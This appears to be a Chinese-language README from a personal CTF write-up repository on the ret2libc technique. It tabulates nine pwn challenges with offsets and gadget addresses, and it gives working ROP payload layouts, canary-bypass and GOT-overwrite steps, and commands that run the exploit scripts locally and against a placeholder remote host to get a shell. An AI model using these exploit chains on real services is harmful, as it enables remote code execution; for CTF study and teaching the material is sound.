# ret2libc

> 共同模式特征：**栈溢出 + leak libc 地址 + 返回到 libc 函数**
> 二进制本身没有 `system@plt`，但通常有 `puts@plt` / `write@plt` 和对应 GOT。
> 利用分两阶段：先 leak，再回 `main` 或重新触发输入，最后 `system("/bin/sh")`。

---

## 1. 模式特征

```text
存在无边界输入（read / gets 等）
+ 可覆盖 saved RIP
+ 通常 No canary + No PIE（13 是 canary 例外）
+ 二进制没有 system@plt
+ 有 puts@plt + puts@got（或 write 等）
= ret2libc
```

标准流程：

1. `file` / `checksec`：确认位数、PIE、Canary、NX、RELRO。
2. `nm` / `objdump`：确认没有 `system@plt`，但有 `puts@plt`、`puts@got`。
3. 反汇编漏洞函数：算 buffer 到 saved RIP 的偏移。
4. 找 `pop rdi; ret` 和 bare `ret` gadget。
5. Stage 1：`puts(puts@got)` leak，末尾返回 `main`。
6. 用 leak 算 libc base，Stage 2：`system("/bin/sh")`。
7. 64 位下注意 `system` / `puts` 的 16 字节栈对齐。

---

## 2. 本模式题目

| 题目 | 架构 / 链接 | 输入点 | 偏移 | Stage 1 | Stage 2 |
| --- | --- | --- | --- | --- | --- |
| `07_newstarctf_2023_ret2libc` | amd64 / 动态 / not stripped | `read(0, buf, 0x100)`，`buf=rbp-0x20` | **40** | leak `puts@got`，返回 `main` | `system("/bin/sh")` |
| `10_jarvisoj_level4` | i386 / 动态 / not stripped | `read(0, buf, 0x100)`，`buf=ebp-0x88` | **140** | `write(1, write@got, 4)`，返回 `main` | `system("/bin/sh")` |
| `11_2018_rop` | i386 / 动态 / not stripped | `read(0, buf, 0x100)`，`buf=ebp-0x88` | **140** | `write(1, write@got, 4)`，返回 `main` | `system("/bin/sh")` |
| `12_bjdctf_2020_babyrop` | amd64 / 动态 / not stripped | `read(0, buf, 0x64)`，`buf=rbp-0x20` | **40** | leak `puts@got`，返回 `main` | `system("/bin/sh")` |
| `13_putsorsys` | amd64 / 动态 / not stripped | menu + `read(0, buf, 0x100)`，canary | **0x38**（canary 0x28） | `%13$p` leak canary，`%9$s` leak `puts@got` | 保留 canary 后 `system("/bin/sh")` |
| `18_repeater` | amd64 / 动态 / stripped | 循环 `read(0, buf, 0x100)` + `puts(buf)`，canary | **0x28**（canary 0x28，saved RIP 0x38） | `puts(buf)` 打 canary，再 `puts(read@got)` 回 `main` | `ret` 对齐后 `system("/bin/sh")` |
| `19_pwnable_silverbullet` | i386 / 动态 / not stripped | `strncat` 把 NUL 写进 `power`，`power` 与 `strlen(desc)` 失配 | 越界 **0x2f**（起点 `ebp-0x3`） | `beat` 判定获胜逼出 `main` 的 `ret`，`puts(read@got)` 回 `main` | `system("/bin/sh")`（整条链无 `\x00`） |
| `20_bbbaby_pwn1` | amd64 / 动态 / stripped | menu：`read(0, (void*)n, 8)` + `read(0, buf, n)`，canary | **0x110**（canary 0x108） | 改 `__stack_chk_fail@got`=`leave;ret` 绕 canary，CSU `puts(read@got)` 回 `main` | 改 `atoi@got`=`system`，菜单发 `/bin/sh` |
| `25_rec_33c3_2016` | i386 / 动态 / stripped / PIE + Canary + FULL RELRO | menu：note `read_line(buf, 0x14)`、Polish 求和、Sign | N/A（**无栈溢出**） | note 泄漏 `text+0x6fb`；Polish 求和每轮 `esp-=8`，把 `puts` / `lsm@got` 喷到 `v1` / `[esp]`，`Sign(0)` 调用 | 同样喷 `[system, "/bin/sh"]`，`Sign(0)` 调用 |

关键地址：

| 题目 | 关键符号 / gadget |
| --- | --- |
| `07_newstarctf_2023_ret2libc` | `puts@plt=0x400520`、`puts@got=0x601018`、`pop rdi=0x400763`、`ret=0x400506`、`main=0x400698` |
| `10_jarvisoj_level4` | `write@plt=0x8048340`、`write@got=0x804A018`、`main=0x8048470` |
| `11_2018_rop` | `write@plt=0x80483A0`、`write@got=0x804A010`、`main=0x80484C6` |
| `12_bjdctf_2020_babyrop` | `puts@plt=0x4004E0`、`puts@got=0x601018`、`pop rdi=0x400733`、`ret=0x4004C9`、`main=0x4006AD` |
| `13_putsorsys` | `puts@got=0x404018`、`/bin/sh=0x40205E`、`pop rdi=libc+0x2A3E5`、`ret=libc+0x29CD6` |
| `18_repeater` | `puts@plt=0x400610`、`read@got=0x601030`、`pop rdi;ret=0x400933`、`ret=0x400934`、`main=0x4007D9` |
| `19_pwnable_silverbullet` | `read@plt=0x8048490`、`puts@plt=0x80484A8`、`read@got=0x804AFD0`、`main=0x8048954`、`pop3=0x8048A79` |
| `20_bbbaby_pwn1` | `leave;ret=0x40086A`、`csu_pop=0x4009FA`、`csu_call=0x4009E0`、`__stack_chk_fail@got=0x601020`、`read@got=0x601028`、`atoi@got=0x601040` |
| `25_rec_33c3_2016` | `puts@plt=text+0x520`、`___libc_start_main@got=text+0x2FE0`、note 泄漏 `text+0x6FB`、`call [ebp-0x20]=text+0xD3E`、Polish `esp` 每轮 -8、填充 **0x63** |

Payload 核心：

```python
# 64 位，puts leak（07 / 12）
# Stage 1
b"A" * OFFSET + p64(RET) + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(RET) + p64(MAIN)

# Stage 2
b"A" * OFFSET + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

# 32 位，write leak（10 / 11）
# Stage 1
b"A" * OFFSET + p32(WRITE_PLT) + p32(MAIN) + p32(1) + p32(WRITE_GOT) + p32(4)

# Stage 2
b"A" * OFFSET + p32(SYSTEM) + p32(0xDEADBEEF) + p32(BINSH)
```

```python
# 18_repeater：先 canary leak，再 ret2libc（64 位，No PIE）
b"A" * 0x28 + b"B"          # canary 低字节被覆盖成非 0，puts 打出剩余 7 字节

b"A" * 0x28 + p64(canary) + p64(0) \
    + p64(POP_RDI) + p64(READ_GOT) + p64(PUTS_PLT) + p64(MAIN)

b"A" * 0x28 + p64(canary) + p64(0) \
    + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
```

```python
# 19_pwnable_silverbullet：strncat 补的 NUL 把 power 打坏 -> 越界覆盖返回地址
b"\xff\xff\xff" + p32(0x01010101) + p32(PUTS_PLT) + p32(MAIN) + p32(READ_GOT)
b"\xff\xff\xff" + p32(0x01010101) + p32(SYSTEM)   + p32(0x01010101) + p32(BINSH)
```

```python
# 20_bbbaby_pwn1：改 __stack_chk_fail@got 绕 canary，再用任意写把 atoi 换成 system
write8(p, 0x601020, p64(0x40086A))          # __stack_chk_fail -> leave; ret
overflow(p, csu_call(0x601018, 0x601028))   # puts(read@got) -> main
menu(p, 2)                                  # main return -> canary 失败 -> 栈迁移
write8(p, 0x601040, p64(system))            # atoi -> system
p.sendlineafter(b"your choice", b"/bin/sh")
```

---

## 3. 关键坑点

1. **leak 前先吃掉 `See you next time`**
   `main` 在 `read` 后、`ret` 前还会 `puts("See you next time")`。
   第一行不是 leak；先 `recvuntil` 这一行，再读 6 字节地址。

2. **leak 是 6 字节**
   `puts` 打印到 NUL 为止，64 位地址通常只有 6 个有效字节。
   用 `recvline().strip().ljust(8, b"\x00")`，不要死等 8 字节。

3. **Stage 1 必须返回 `main`**
   第二阶段需要重新触发同一个 `read`。
   如果 Stage 1 直接退出，就没有第二次溢出。

4. **64 位对齐要补 `ret`**
   Stage 1 的 `ret` 对齐 `puts`，末尾 `ret` 对齐 `main` 重入；
   Stage 2 的 `ret` 对齐 `system`。

5. **`pop rdi; ret` 可能是非对齐 gadget**
   本题在 `0x400763`，是 `pop r15; ret` 中间的 `5f c3`。
   用 `ROPgadget` 或 `ROP(e).find_gadget(["pop rdi", "ret"])` 找，不要只盯着函数符号。

6. **libc 不对就不要硬打**
   检查 `libc_base & 0xfff == 0`。
   优先用题目附件 libc，设置 `LIBC=/path/to/libc.so.6`。
   原题按 Ubuntu 18.04 构建时，`libc6 2.27-3ubuntu1.6` 的偏移是：
   `puts=0x080970`、`system=0x04f420`、`/bin/sh=0x1b3d88`。

7. **canary 题先泄 canary，别急着 ROP**
   `puts(buf)` 这种“回显”型溢出，多发 1 个字节就能把 canary 打出来（18_repeater）。
   `read` 可能短读，泄漏长度不对就直接重连，不要试图补救。

8. **循环型程序要看 `scanf` 的语义**
   `18_repeater` 里 `0` 表示继续循环、非 `0` 才走 `return`；
   发错值会导致 ROP 永远不触发，看起来像“偏移算错了”。

---

## 4. 文件说明

| 文件 | 作用 |
| --- | --- |
| `07_newstarctf_2023_ret2libc_speedrun.md` | 2 分钟速通：偏移、gadget、两阶段布局、libc 识别 |
| `07_newstarctf_2023_ret2libc_exp.py` | 武器化 EXP：LOCAL 用本机 libc，远程可 `LIBC=` 指定 |
| `10_jarvisoj_level4_speedrun.md` / `10_jarvisoj_level4_exp.py` | 32 位 `write` leak 模板 |
| `11_2018_rop_speedrun.md` / `11_2018_rop_exp.py` | 32 位 `write` leak 模板（同 10，地址不同） |
| `12_bjdctf_2020_babyrop_speedrun.md` / `12_bjdctf_2020_babyrop_exp.py` | 64 位 `puts` leak + `ret` 对齐 |
| `13_putsorsys_speedrun.md` / `13_putsorsys_exp.py` | 格式化字符串 leak canary/puts + canary-safe ROP |
| `18_repeater_speedrun.md` / `18_repeater_exp.py` | canary leak（`puts(buf)` 型）+ 两阶段 ret2libc，含短读重试 |
| `19_pwnable_silverbullet_speedrun.md` / `19_pwnable_silverbullet_exp.py` | 逻辑 bug 型栈越界（`strncat` + `power` 失配）+ 两轮 ret2libc |
| `20_bbbaby_pwn1_speedrun.md` / `20_bbbaby_pwn1_exp.py` | 8 字节任意写 + `__stack_chk_fail@got` 绕 canary + CSU ROP + `atoi@got` 改 `system` |
| `25_rec_33c3_2016_speedrun.md` / `25_rec_33c3_2016_exp.py` | 未初始化函数指针 + Polish `esp` 泄漏栈喷 + 两阶段 ret2libc（32 位 PIE / FULL RELRO，无栈溢出） |
| `[NewStarCTF 2023 公开赛道]ret2libc` | 07 的题目二进制 |
| `jarvisoj_level4` | 10 的题目二进制 |
| `铁人三项（第五赛区）2018_rop` | 11 的题目二进制 |
| `bjdctf_2020_babyrop` | 12 的题目二进制 |
| `putsorsys` / `libc.so.6` | 13 的题目二进制与附件 libc |
| `repeater` | 18 的题目二进制（stripped，64 位） |
| `pwnable_silverbullet` | 19 的题目二进制（not stripped，32 位） |
| `bbbaby_pwn1` / `libc-2.23.so` | 20 的题目二进制（stripped，64 位）与附件 libc |
| `rec_33c3_2016` / `libc-2.24.so` | 25 的题目二进制（stripped，32 位 PIE）与本地复现用 i386 libc 2.24-3ubuntu2.2 |

> **25 的两个附件不在 git 跟踪内**（仓库约定只提交 `.md` / `.py`）。
> 从零复现时按下面的来源取回并校验：
>
> - `rec_33c3_2016`：
>   `https://raw.githubusercontent.com/ctfs/write-ups-2016/master/33c3-ctf/pwn/rec-200/rec`
>   → sha256 `cc549fbc6045151381eae842b8f4b7a3130c1bcf0e22d5f2093ad92008ebed49`（9564 B）
> - `libc-2.24.so`：old-releases `libc6_2.24-3ubuntu2.2_i386.deb` 解包出
>   `lib/i386-linux-gnu/libc.so.6` → md5 `79f8c0d940ae393b3ad1be40892c9c84`；
>   loader 用同包 `lib/ld-linux.so.2`，通过 `I386_LD` / `I386_LIBPATH` 指定。
>
> 可直接照抄的命令、校验值与预期输出见 `25_rec_33c3_2016_speedrun.md` §8。

这些题目都没有单独留 `writeup.md`；对应的 `speedrun.md` 已包含完整逆向、栈布局、gadget 与两阶段利用说明。

---

## 5. 使用方式

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

# 静态确认
file '[NewStarCTF 2023 公开赛道]ret2libc'
checksec --file='[NewStarCTF 2023 公开赛道]ret2libc'
objdump -d -M intel '[NewStarCTF 2023 公开赛道]ret2libc' | sed -n '/<main>:/,/^$/p'

# 本地：用本机 libc 验证 leak + 二阶段
python 07_newstarctf_2023_ret2libc_exp.py LOCAL

# 远程：明文 TCP
HOST=target.example.com PORT=9999 python 07_newstarctf_2023_ret2libc_exp.py

# 远程：指定题目 libc
LIBC=./libc-2.27.so HOST=target.example.com PORT=9999 \
python 07_newstarctf_2023_ret2libc_exp.py

# 10 / 11：32 位，需要 i386 loader
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
python 10_jarvisoj_level4_exp.py LOCAL
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
python 11_2018_rop_exp.py LOCAL

# 12：本机 glibc
python 12_bjdctf_2020_babyrop_exp.py LOCAL

# 13：附件 libc + 2.35 loader
LIBC=./libc.so.6 \
LD_SO=/tmp/libc235/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 \
LIBC_DIR=. python 13_putsorsys_exp.py LOCAL

# 18：canary leak + ret2libc（64 位，No PIE，stripped）
python 18_repeater_exp.py LOCAL
LIBC=./libc-2.27.so HOST=target.example.com PORT=9999 \
python 18_repeater_exp.py

# 19：逻辑 bug 越界 + ret2libc（32 位，需要 i386 loader）
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
python 19_pwnable_silverbullet_exp.py LOCAL

# 20：任意写 + canary 绕过 + ret2libc
python 20_bbbaby_pwn1_exp.py LOCAL
LIBC=./libc-2.23.so HOST=target.example.com PORT=9999 \
python 20_bbbaby_pwn1_exp.py

# 25：未初始化函数指针 + Polish esp 泄漏（32 位 PIE / FULL RELRO，无栈溢出）
# LOCAL 需要 i386 loader；不设 LIBC 时自动用 I386_LIBPATH/libc.so.6
I386_LD=/tmp/libc224/root/lib/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc224/root/lib/i386-linux-gnu \
python 25_rec_33c3_2016_exp.py LOCAL
LIBC=./libc-2.24.so HOST=target.example.com PORT=9999 \
python 25_rec_33c3_2016_exp.py
```

CTF² 等 TLS 平台：

```bash
SSL=1 HOST=target.example.com PORT=9999 \
python 07_newstarctf_2023_ret2libc_exp.py
```

---

## 6. 题型识别卡

```text
read/gets 栈溢出 + No canary + No PIE
+ 没有 system@plt
+ 有 puts@plt / puts@got
= 先 leak puts，再回 main，最后 system("/bin/sh")
```

```text
Canary + read(0, buf, N) + puts(buf) 回显
= 先靠回显把 canary 打出来（低字节改非 0），再走同样的两阶段
```

```text
结构体放栈上 + 长度检查用 power、写入位置用 strlen(desc) + strncat 自动补 NUL
= 逻辑 bug 型越界：让两个计数失配，越界长度和起点一起变大
```

```text
有 canary + 存在任意地址写（或可控长度读）
= 不要死磕 canary leak：先把 __stack_chk_fail@got 改成 leave;ret / main，
  让校验失败路径变成栈迁移入口，再用 CSU 链 leak libc
```

```text
32 位 PIE + FULL RELRO + Canary，但根本没有栈溢出
+ 菜单里有未初始化的函数指针（call eax / call [ebp-x] 前没赋值）
+ 某个循环的 sub esp / add esp 不配对（esp 泄漏，每轮 esp -= N）
= 找一个 note / 回显泄漏 PIE base，再用 esp 泄漏把 (函数指针, 参数) 喷到深层栈，
  把 call 变成任意函数调用：call puts(GOT) -> base -> call system("/bin/sh")
```

一句话：**Stage 1 只负责 leak 和回 `main`；Stage 2 才打 `system`。别把 `See you next time` 当 leak。**
